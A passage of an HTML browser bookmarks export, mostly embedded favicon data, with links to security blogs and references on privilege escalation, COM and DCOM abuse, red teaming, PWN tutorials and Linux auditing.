icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADI0lEQVQ4jXWTMUijdwDFf98/XypRc6lJkIT0jF4MCdImEoxToQiCokM7OOh80FHwCjVDhwwd4tCC60EXKTRZpN1KK+KJW2ysOdAvJv1MVLg26uepiYl+Sf5dHK6lfdt7vPeWx1P4F1ZWVkJSys+BT4DRR/l34JWiKC+Xl5cL7/qVd0kqlXohhPgqGAzmo9HoE1VVhwBardbx/v7+TbFYjHQ6na8TicS3/yhIJpPv2Wy2n+x2+7O5uTlRLBaHC4UC1WoV0zTxeDxEo1ECgUAxk8nI29tbvdFofJpMJh8sANPT09+4XK4P5+fnB9bX170HBwfUajWklAghuLu7Q9d12u22a2Fhofvw8PDeNM3AxsbGL0oqlfpICPFqcXHxr62trXCr1eLo6Ijh4WGEEADU63XK5TJLS0tYrVYeHh5OV1dXe1ut1scCeB4Oh/eEEOGpqSlCoRCqqgIwMzPD7OwsiqKgqipv/nwDQLPRePqYeS6A6Vgs5tjc3ASgq6sLKSW6rqPrOgA2mw2LxcJvuzkATk5OicViDmBaAEMej2eoXC5jGAZer5eenh5UVaVYLCKlZGRkBLPZ5O3VFQClP0q43e5ngE88zqRYrVYKhQIWi4VQKISUEpfLBYDf76fbbqfX3svl5SXVahVFUQAsAji5uLjQ3W435XIZKSXBYJBmvY7dbmd7exshBD6fD6/Xy97eHu12m/Pzcx04EVLKn3O53HUgEMA0Tc7Ozujv7+dZMEipVGJnZwcFGB0dZXBwkN3dXcLhMLlc7hr4VSiK8lLTtKjf7z9yuVxUKhUAJicnOT4+xjAMavU6A08HuKvX6evrY2xsrKBpWhT4TiQSidftdvuHdDpdm5iYqN3c3GCaJoqi0Gw2cTgcaJqGooBxdcX8/Hwtk8nUO53O94lE4rUAuL+//8IwjOra2trp+Ph4SUpJtVrF6XTi8/loNBqgKAQCgVI6na4YhlFtNptf/u+ZwuHwfiQSeeL3+wcBKpVKOZ/P32iaFv2vM3UDvcD7QF88Ho/E4/HPnE5n5Pr6+gMAh8NxZhhGPpvN/pjNZvPAFfAWqP0NkFlzIkvmn10AAAAASUVORK5CYII=" target="_blank" rel="noopener">https://legend.octopuslabs.io/feed</a><br>            <dt><a href="https://blogs.msdn.microsoft.com/aaron_margosis/2018/06/26/announcing-application-whitelisting-with-aaronlocker/" add_date="1530001826" target="_blank" rel="noopener">宣布：使用“AaronLocker”应用程序白名单 - Aaron Margosis&#39;Non-Admin，App-Compat和Sysinternals WebLog</a><br>            <dt><a href="https://rayanfam.com/" add_date="1533785844" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACZUlEQVQ4jV1Tz2vcdRB9b+bz2bQb45IGgikFIw3peTeBKLSCvXjo2VwVAyJY8OKld8Wrp1YQ8S9o/4NiVPSY5NbbnjbqXhLJtm62389nnofshqxzmjm8eT+GIS6KAAQAvV7vXQCfkrwv6RYAkBwA+LnW+tPR0dEfVzGcDtjY2FjodDrfAHhIciEiMFsKgGYGSa8BPBkOh48Gg8EYAByAra+vLywvLz91949rrQagTBlmBJJUJCV3f6/dbm+TfDYajaoBiJWVla/d/UHTNBOSAJCugGdyE0mUUiYppQ/X1ta+BRDsdrvbZva7JBNkBOeAJCFpZgWSRDJIqmma943kZyRbCAEFlM2xagrmTI+ZzQiyu39uJO9HDUWLpiXCzgRIFCToModZD0mQZFMlH1hE3FIV0AJf7jpePXBAFCsoak7NnK+L+eaF4ATZSHjzhwISOPnKEUsEg4ARnItlvszMBgQpQuUdoqwS1w/AeFl0PjnHZHyO8XisUsrlllkuJP9KAPYt7HbpRB3fc7/+WyC9KFp8q8Mbb99QrRXuzpOTE52dncHdQTLMLEXEvq+urv5tyT7ha/DaoZj+If/1c3R7Xex+tMvNzU3u7Ozo9PRU/X7fWq2Wpv4jIh4SAHq93nfJ05dNbSYAMkHWWtE0zaXXnDPcXZKanPNCKeXxwcHBFw7ASP6y+MbidkrpTtQQgGpmzDkz54ycs0iGJKaUcq31eSllbzgcVgeg0WjUuPvTdru9RHLLzLIk/i9sI1ki4vvj4+O9fr//Cle+8fLOW1tbdyXtTd/55vTufwLYj4gfDw8Pf72K+Q8/rTFsfZZWDgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">新浪和Shahriar的博客 - 一个积极的无序博客……</a><br>            <dt><a href="https://darrenliuwei.com/%E5%85%8D%E8%B4%B9ss-ssr%E5%88%86%E4%BA%AB.html" add_date="1535770857" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACBklEQVQ4jaVTTWsTURQ99840sbEDYWjeQCgSSWjIewERP3BlwV3XblwI9QcIde3G3+AfsGv32bjtQrq3TTqVbNwIzSRDlSzSvHnXhTM6hrgQDzy4vHvuuefexwP+E7TmztNaPyMiJSIWgBBRzTl3MhqNjvMaKcj+iph0u10jIk1r7RERVay1dmNjo8bMLwCcAFiWu5UFBACY+QERnV5cXCRlojHmqtfrPcpd/LZbBK1Wq95sNg+IKFgsFh/SNJ3nrggAKaWuRORJFEU6CIJxmqYLAOBiD5ubmzvMfNc5NxiPx5clVwJAzs7Ohsw8AHC/UqncKsb+5SBJkkul1BciOtje3q4kSfI5bwAA0Fo/J6I959zR+fn56Zrl/0S73VZa69fl/TQajS2t9RsAlVU+r8ae520BuNPpdGpFIgiCkJlNvV6vrdZ5JQHp9/s9Zn4KYBnH8aBIpGk6bzQaj4Mg2FFKfZ9MJpd/CERRdLPVar10zvUAfMyy7P10Or0ui4dheExElL/EQ2b+NJ/PlwDA/X7/UGu9/9fFrEBrvW+MeQWAvd3d3dsA7o1Go3edTqcahqE/m804n7N8PGOMr5TyhsNhrJTai6LoK7XbbVWtVg9F5BszCwCISMbM6/4JnHMQESKiuu/7bwuSb4y54XmeZFlGAGCtXSvg+75YaymO4wWA63Wcf8IPXh+2Al/AzGAAAAAASUVORK5CYII=" target="_blank" rel="noopener">免费ss/ssr分享 | 刘伟</a><br>            <dt><a href="https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/" add_date="1536041620" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Abusing the COM Registry Structure (Part 2): Hijacking &amp; Loading Techniques – | bohops |</a><br>            <dt><a href="http://touhidshaikh.com/blog/?p=790" add_date="1536414413" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACFUlEQVQ4ja2SS08TYRSGn2/ma6fN2FLbcFOJYFK5VEWNMSGBuDNx5cKtCzb+AsMPcGPCyoUuXJtAdGuiGEnUGAgGWkiJ5SaXtoHSIgHpAC12Zj4XRAxR2OC7OzknT973zRFAgRNIAOokAHlSwCEHQgiEEH+2SuGq4/n/JcKBzjfUcykWxfB6KZXK5NfWmZ1Ls1sqHw34bbmz4xoPuu/hNSS67kEpl8ApkydPX/D+wwiapuG67t+AZDJJqbTL4swXKnvbtF7uou5MIz09D8nn0qytbwKgjuhCBgJBYrE2VpYSWMU9PB6JpuksLi0zNDRycHgUQBiGoeLxOKqyycToRwy/n/JehUx2leTkNAODw5SO68C2KziOy5WrnQy8G2Q5O05bS5TW5iaut7cQiYToe/WGhrN1AKysriF1ndqaCIbhRWqajuPYCCFIpjL0973EZxjc6rpB9/27NEcbuXO7i3R6maK1Q8fNdoIBk8/DCUKhINp+Ppe5qVHCVTqRcBUIheM4SCkpl39yOhTEth1y+e9MpuaorYmwtWXxbT6D8Hg8amxslHw2SWE1g99vUrEdTNOPbds8e95POpvjXH0NX2cW0ISg5WITO7tlVnIFhJRSJRIJotEL9D5+xMR4nOrqMMXiNqmZBaamFwAIBkyk1Nn8YaGUIhyuwq7Y+59oWRY+n8nsfI7Xbz/9s+2itXNo3tjYAuAXsOLerSceLTwAAAAASUVORK5CYII=" target="_blank" rel="noopener">Abusing SUDO (Linux Privilege Escalation) - Touhid M.Shaikh</a><br>            <dt><a href="https://gtfobins.github.io/" add_date="1536454300" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAB5ElEQVQ4jaWTsWtUQRDGf/Nudy9e6pAU4YgHAcVOiCQRhBAChhR2NvkvLK1SWd5/IYEUgoVocxGClwsqYhMucKIgV8WAhcmZ2333xuLtcs9WBx7Dzs43O/O9+QQogOvoJXoHKBAozcY7D2TxLgNmAK6AB8ASsAw0gXdAG1iMXzvGmjFnKWKuTKz2FRgytefAl0rsNTAAvldyckCz2NpM9ABZ37mNgTErKXNgzErfuY3YNlWMiYEC0AOoDcGdqz4y0NgDA3AO67nqVhvqi+AfwyRiEGAE3AG+HTv3RlTXfovUBbSmOgKYiDQU5IbqWEV6694/BG4Cp4kDoezvkxEZXatuZyI/aiInscPVieqcFenkcFYZQwEugVaFHI6svehau5/OXWv3j6y94G9rAZcZ/2mGKfucOPfMwK1fqrMqcr/r3AHApBxh9qNzL3I4W/X+aRojFVCAAu4G1TUVkQLmJqqbEEkUkaC6qSKNCFZA0loKwND7nV4ICzVVcUXROQxh/jCEeVcUnZqq9EJYGHq/k14HNO1BBkj8v+O+yEuj+nmv3DZ24TgXGT2BMVPNZIkDpRSTxmLFbe/fUq4yAMt5/gH4GcFUMYmDVixmKV/ZBd4D/QjYBu4Br4A6pUqbgCT5/rOc/wDffcNOqak+VgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">GTFOBins</a><br>            <dt><a href="https://linux-audit.com/" add_date="1535906504" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACIUlEQVQ4jaWTwUtUURSHv3PvHWfS1MICcVfZIt6m8VERQRltWkZgLYIWSUFtol2rUKhFy+ivaFULKQjapDmJDDRNr1DDsNAkTE2bYeY9554W6lg5m+gsDz8++H7nXvjPkUbLvr4+OzMzs8vEcav3TX9kNK3inFvO5XKLjQDmWE/PUa/Sj+E40I5uy1hBn5aq1etRFMVuc9vb2+tKq6tXvTKAsOiVoRgzqaq1Oh0jRtRUlYkPUZQA1AGllZXzIPcEfbxcS9+ZaM1Z4BxCuq5rmMIzi6cDEAEVgGw2u9eJeQb6LZ0kl0aKxSU9xWk8D4E0oIAFRhEKKPspc1PyJA7AWnsEr93A4EixuKRgWOAVnZyhgiXDukaFMm3E1HAyzJaCqB5CWP2OFPQkWTy3EZpIUAxCwhNgCsNZatyX55Q21dcBHqeCTzSzhiIIFsGiKGDwGARBMH+f3AGo6CeQtk7K3TLMS4ULBDg62U2MwW8oCG+ZJdGQZslTrgPWVMdSIgvemMtBELyWKIp1DyeIeQBksL+V2EEBzz4NuSV5EgswPz//o6urq0mUG6mUq861HM4PtHyMMSTAO+ANSgFhFE+EMMcYk4ObZwQIgmBnczpzV6Af4UXi5dFP46aN9zXV9VwKUOtNhR1fp/Mjn7c95TAMm43qRZBrwMGNQrVBb0PlauVKFEVxw88UhmE7cEBEOsR7K2xBFISa/TJeGH8P2+D/Pr8Ahjrk2JKOqpgAAAAASUVORK5CYII=" target="_blank" rel="noopener">Linux Audit - The Linux security blog about Auditing, Hardening, and Compliance</a><br>            <dt><a href="http://vinc.top/category/yjxy/page/2/" add_date="1537065431" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACbklEQVQ4jU1SMUszURDcfXc+JXjnJZyJSFTQ6IWgFkosUghp7FSwtlCs/QV21vkhFrGxtLBQsJAciESwCGisRBL0jGDu3tu3Fscn39SzOzszC0SklCIiZo6i6Ozs7ODgoN1uG2PiOCYiIjL/wMygtSair6+vRqMRBAEAAMDR0REzD4fDOI6VUuY/QJIkRLS3t5dSpZRSSs/zXl5emJmZUx1mThWsk5MT27allOfn50IIpRQiGmMymQwzNxqNfr+/trZGRIgIAKiUAgDbtvf395vNZi6Xs217bGyMmTc3N3d3d2u1mud5qb4QwmZmIQQAHB4e3t7eSimDICiVSvV63ff9paWlXC4HAEopZkZETJIkiqLT09Pn52djzM7OzszMTKVSabVaxph8Pj83N+c4ju/7AGCMQWPM+/v7w8NDoVC4vLxcX1/3PA8RW61WGIaO45TL5a2tLcuyfn5+isUiaq2FEIh4f3/f6XSmp6cR8e7urt/vFwqFSqWysrLi+/7Nzc319fXx8bENAEQkhBgZGSGiWq3W6XRWV1eXl5dd1318fLQsCwDiOM5kMuPj4yL1zszz8/ODwaDdbqeOJycnwzB0XTebzXa73cFgUK/XhRCYBmyMEUJ8fHw0m03P81zXDcNQKVWtVhcXF6MoKpfLSZJMTEygMSbNOM1Xa31xcUFET09PxWLRdd2pqakgCHzfT4u3/9Yzc/pnb29v29vbvV5vdnYWAKrVqpRSa42IiCjSOtJpy7K63e739/fV1VU+nx8Oh6VSqdfrGWNSNgDYKRsAEFFrPTo6ms1mFxYWNjY2Xl9fHcf5/PwUQvxd/gs9ZnNtUBGHWAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">应急响应 Archives - 第2页 共2页 - Vinc&#39;s Blog</a><br>            <dt><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-buffer-overflow-0x01/" add_date="1537107878" target="_blank" rel="noopener">实际案例：缓冲区溢出0x01 - 最大Kersten</a><br>        </dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></p></dl><p><br><br>            <dt><a href="https://rmusser.net/docs/Privilege%20Escalation%20&%20Post-Exploitation.html" add_date="1536835188" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAATElEQVQ4jWMMiMhmIAWwoPEdinDqP9A3FV0DXDVEDqsUEzFmIwMmklSj2EAkQPgB093UtoEBm08wrWXBL02yDZgGDWobiIxsRlKTNwA/ih1Z/AWyTQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Privilege Escalation &amp; Post-Exploitation - InfoSec Reference</a><br>        </dt></p></dt></p></dt></p></dl><p><br>        <dt><a href="https://github.com/demonsec666" add_date="1514961339" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">demonsec666</a><br>        <dt><h3 add_date="1536300538" last_modified="1536300582">PWN</h3><br>        <dl><p><br>            <dt><a href="https://www.jianshu.com/p/187b810e78d2" add_date="1536300555" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACz0lEQVQ4jV2ST2hcZRTFf+f7vvfezOuk0cTWaYtVUEGyEhV0oaBQ0uJCpV1lUwuCBSMoLQiiIoJ/KNiCi1hdxC4UBP/gUtCNiOBG3XRRin9qaJPUUs1Mp0ln3nvfd11MI8WzvNx77uGco5VDe/bnLj9Rp3RbAoiNzHlJYhOWEmDIeQPMSWTS+SpVR4JZWADrRkjCpHZH1COsqsbX3qMsB+ewaxsSRjQsK/LbjbDgJLpDw9Kg7/KZ+7Tj5JcW7rgbTWwldHdhdc3Ui28wffQtlOfmpm+V39Z1w2Qm6Gr50L5ksZGfmLTpl9/FYiM/vZ1meYnqz1+xqwO27N1Pfe4s2Z330Px2xuqV81z5/CNZXZsjRchypl46RnNpVZdeOUz1x1mGp39i8NUntB+ZZe3k2/x9/DVsY52r33+j3uJxLCXkHbpwcNbULnFlh9a9D9J+6FHWv/uaiX0HMAlCIP1zGdcuIcuRHP1PP2D4y4+4dkmQc9jGOnE0pL5wjrL1OMpy+p8t4soOFhsUAmk0RHJMvfA6bnIKixGTCCaRRtfo7HmSyYPPs/rcASbnDtOZfYo46CM53JYO1e9n6J16b5yOJSSQGUESMgMYxxUjYftOLEXW3n8HUsPN86+S3TWDihZyjv8qIhEwAwkzGxfGedJwg/yWGW565ghgZDt30/y1AhJcf7aJMB6CpOsLCdcqaZaX6H14DARTR99EeQEpYjdymBEwM4QAI0YhEQd9wq7dbJ17FuUFKtr0P14gXemPlbtgmAnJwpjIkA+4PEd5QW/xBK7dRnkLgDTo4bftoPPEHC5kpMEaOD9WIJCct2btstZ/+BaqkVHXSk0FqTf2p6kpH7uf8oGHrf/FKQ1P/ywVLZOZtPz03tUi+O6wiYm6ElkmyfF/WNOAgKoyipa1suBGTbropDiPseQlVLRMyOxGpzcjDgE5byo75r0HY0lq5v8FS/1LVvsjW/AAAAAASUVORK5CYII=" target="_blank" rel="noopener">PWN入门（从零开始学习PWN） - 简书</a><br>            <dt><a href="http://wiki.ubuntu.org.cn/%E7%94%A8GDB%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F" add_date="1536300582" target="_blank" rel="noopener">用GDB调试程序 - Ubuntu中文</a><br>        </dt></dt></p></dl><p><br>        <dt><a href="https://twitter.com/" add_date="1519134905" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACgElEQVQ4jX1TTYscVRQ9577XVdXd00kclCHJaHCyCGQXyEoIuIq6CQg6O3FiwL0rNwr1FxxEDEFMAtlMyDIE4iaQdSQqutLRxUwy6gTy0d1VXR/3uKgeMWpy4W3uu/fcd949BwCAPDc8KyT+J5fr73o+VUjqX6UEoKULD1/tJfEM4Ikau7l9buE7bChZevD7Ab74VXksC7M3ttb2rwMANhSwyha5DDn94NeP3oxpdoW9ZBEEfDIuYfEy2mrYiudjFmYnmY0+W740PrT16/ATrLLZG7+4/mBfMHxJC4s+eTIDSUCZDbIPNfVNtrpugnZUF7Bs+PHy0ent5UvTt5HfGyCnh1FcAnjEy6mLSAD1QDaqmlru35J+k1hXenj0+Kpl/bfgiiChqtgEeQuCAzhLIgiQBIH00B+Gevr43ftrB67FQwuPTpnFFNXMRTRwN/bSFSbpCgSoeAJI3esJAh40KxnIKQBEZ/qzoX6d2UKiYuwkqaZyNZXPvyKQpLqNOC1SbTMpQ7wLALZztv+bE++grX+h0QFovr7A7kBdToIcaR8Abu++N7wPiAYA9zZHN1CVP5K2BwBy3tWhEaAIAm1LQZ93ggKtU9pP5rRtGwwSxjRA6mh3OBQgSI0NR9HLybXttf3XIRE5/SmZHrw4Ph1D+FTAa/JaBAyAQ3Ib7ut5Obnb1Dq988HC7lzEiq9cefhCUVWpKT1C+gm4L9Ni0+laxpgG9pLQFpNvZnWxtnvupT8BcY9qbGo7njL7iCGcscVBDy2gBlAtoCpc3v7gxfiL7fdH5+emmbP6p5ly2csr1XFHeYLgYcmNsD+A+P1Wv38Hq2z/r3luzedYeS82FJ519RceFTBxSvLCewAAAABJRU5ErkJggg==" target="_blank" rel="noopener">https://twitter.com</a><br>        <dt><a href="https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors" add_date="1529240999" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACOUlEQVQ4jWPcFykhwMHEAAMffvyDcJm5+DhltV/cvszz7wuyLIsABxNcEQMDgwAHE7O2m1JwIaesNgMDgxIDw/fXj1+ubvp0fidUNt2Ql4OF8cOPfxwsjAwMDOJ+hYrx7az8YtfPHNm+esmXTx+U9EwFTP2+8kj9urKbgYGB8VyiFNw6GX1rpZKVP798zIvwvHHlooYwm4ogC4OkVubUTTx8/IsrY/XfHES4XoCDid8xkYGBoSot4tmtyxUWAtFa3O6KnO4c969OSGZgYFBwDLvy+hfThx//EHo0rb59/njxxOFEPV5pXmaI9xgYGDgfn/r26rGtm++hxz+Z4KKQkPny6SMzI4OKIAvcWogs489PDAwMd97/ZkIW/XLzuJi0nL6+AYq1HEw/eKQ5ZbUf3bzMwMDAhGzS+2NrGBgYdOy9vv7+j2ytbtEcBgaGrauXSPEysyCb9O33fwYGBmVNXTmHVZyvbzw7tUNc10rQKpRNWObRzcsr5kwJ1eBmhMe0uF+huG8hAwPDl08fefj4GZDA1kXTZve18v3/kqLHC41p3cx+QatQiOr8CI+vrx6rm9gqa+revX75xpWLb589spPlcFfi42RhZGFgYICrZmBgmN5S/urOlRhtHoWfR+7u38/z5a+/CDOPJJ+CANTxLCIuyXDV3WUZO9csidTi1hRh/fDjn44om44oeqJk+vX2CVz1llWLI7W4TSXZkcMaPUL2RUr8ljfbdu/7xROHI7W4VQVZsaZ2OBcAsL/tmnRTUlEAAAAASUVORK5CYII=" target="_blank" rel="noopener">Resource: Infosec PowerShell tools, resources, and authors by Claus Cramon Houmann - twitter, how to, vulnerabilities | Peerlyst</a><br>        <dt><a href="https://www.youtube.com/" add_date="1515587340" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABCElEQVQ4ja2TMU4DMRBF38wiEFIqKFYIUSAtJ8kNcoood8jJopwgRyANNCg1aSJl/Sls73rdoBC+NLI982c8/raNAgIHLC2NKZRHg1BHavKvyDlWOGbAG9ACT8RuSgTgCzgA7wbHstpC8Ck4CSSQzDTMp3ZK3EVOvhN8pGAvCILzYGbnYh0SRynn1oEX4JGpME7bOmaO5Lh7daQAPADPDtwnLSKhaaI2q5Wx2RhdZ4RgTIXOBWde7WyYRWLfw3wOux2s12PhaaFQK30xbqqzCSnu1DSw3cJyCfv9GI+Wu3AEneCY1M23ENS2QWZx7h4G/8j7FrxefY25rz8/pH97ytd/puS8+Dv/AFRGv3m23DwSAAAAAElFTkSuQmCC" target="_blank" rel="noopener">www.youtube.com</a><br>        <dt><a href="https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/" add_date="1524989362" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Abusing DCOM For Yet Another Lateral Movement Technique – | bohops |</a><br>        <dt><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit" add_date="1525249049" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">infosecn1nja/Red-Teaming-Toolkit: A collection of open source and commercial tools that aid in red team operations.</a><br>        <dt><a href="https://adsecurity.org/?page_id=1352" add_date="1526861564" target="_blank" rel="noopener">演示文稿 - Active Directory安全性</a><br>        <dt><a href="https://github.com/cujanovic?tab=repositories" add_date="1527158767" 